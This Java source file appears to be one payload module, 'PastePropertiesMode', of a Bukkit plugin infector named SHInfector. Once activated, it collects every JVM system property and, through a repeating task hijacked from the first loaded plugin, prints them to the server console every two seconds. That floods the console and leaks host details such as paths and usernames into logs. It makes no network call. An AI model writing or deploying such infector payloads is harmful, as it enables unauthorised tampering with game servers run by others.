package com.macguy8.SHInfector;

import org.bukkit.Bukkit;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * Created by macguy8 on 6/1/2014.
 */
public class PastePropertiesMode implements InfectModeBase {

    //*************************//

    private List<String> messages = new ArrayList<String>();

    //*************************//

    public void activate() {
        for (Map.Entry<Object, Object> entry : System.getProperties().entrySet()) {
            messages.add(entry.getKey() + ": " + entry.getValue());
        }

        new BukkitRunnable() {

            public void run() {
                for (String message : messages) {
                    System.out.println(message);
                }
            }

        }.runTaskTimer(Bukkit.getPluginManager().getPlugins()[0] /* This is hacky, but w/e */, 0L, 40L);
    }

    //*************************//

}